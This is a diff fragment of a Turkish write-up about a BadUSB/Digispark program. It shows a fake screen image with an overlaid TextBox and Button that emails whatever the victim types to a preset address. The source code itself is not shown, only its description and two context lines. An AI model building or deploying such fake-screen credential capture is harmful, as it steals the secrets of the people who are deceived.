@@ -7,6 +7,8 @@ Bu programı BadUSB ile birlikte kullanmak amaçlı oluşturdum ve BadUSB olarak
 
 Digispark ile ilgli bilgiye ulaşmak için: https://digistump.com/wiki/digispark bu adrese bakın
 
+Sahte görüntü tamamen bir görseldir sadece TextBox ve Button olan kısım eklenmiştir butonun daha gerçekçi gözükmesi için PictureBox olarak ayarladım.
+
 <strong>PROGRAMIN KAYNAK KODU</strong>
 
 <pre><code>Imports System.Net.Mail
@@ -68,3 +70,5 @@ End Class
 </code></pre>
 
 Kaynak kodlardan da görebileceğiniz gibi oldukça basit bir kodlamadır kodları ikinci defa yazmamın sebebi girilen texti hem enter tuşuna bastığında hem de ekrandaki ok işaretine bastığı zaman belirlediğimiz mail adresine göndermesi içindir.
+
+
